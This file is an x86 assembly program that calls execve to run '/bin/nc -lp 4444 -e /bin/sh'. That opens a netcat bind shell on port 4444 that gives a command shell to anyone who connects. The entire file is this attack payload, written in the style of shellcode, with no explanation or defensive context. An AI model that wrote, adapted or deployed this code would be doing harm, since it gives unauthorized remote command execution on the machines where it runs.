global _start
section .text
_start:

mov edi, 0x6e69622f; 0x00636e2f6e69622f ~ '/bin/nc'
mov edx, prm ; 0x0804a000
mov dword[edx], edi
mov eax, ptr
mov dword[eax], edx
mov edi, 0x00636e2f;
mov edx, prm+4 ;
mov dword[edx], edi

mov edi, 0x00706c2d ; '-lp'
mov edx, prm+8 ;
mov dword[edx], edi
add eax, 0x04 ;
mov dword[eax], edx

mov edi, 0x34343434 ; '4444'
mov edx, prm+12 ;
mov dword[edx], edi
add eax, 0x04 ;
mov dword[eax], edx

mov edi, 0x0000652d ; '-e'
mov edx, prm+16 ;
mov dword[edx], edi
add eax, 0x04 ;
mov dword[eax], edx

mov edi, 0x6e69622f; 0x0068732f6e69622f ~ '/bin/sh'
mov edx, prm+20
mov dword[edx], edi
add eax, 0x04
mov dword[eax], edx
mov edi, 0x0068732f
mov edx, prm+24
mov dword[edx], edi

mov edx, 0 ; ~ NULL
add eax, 0x04
mov dword[eax], edx
mov ebx, prm ; ~ "/bin/nc"
mov ecx, ptr ; ~ {"/bin/nc","-lp","4444","-e","/bin/sh"}
mov eax, 11;
int 0x80

section .data
prm times 64 db 8
ptr times 64 db 8
.end:
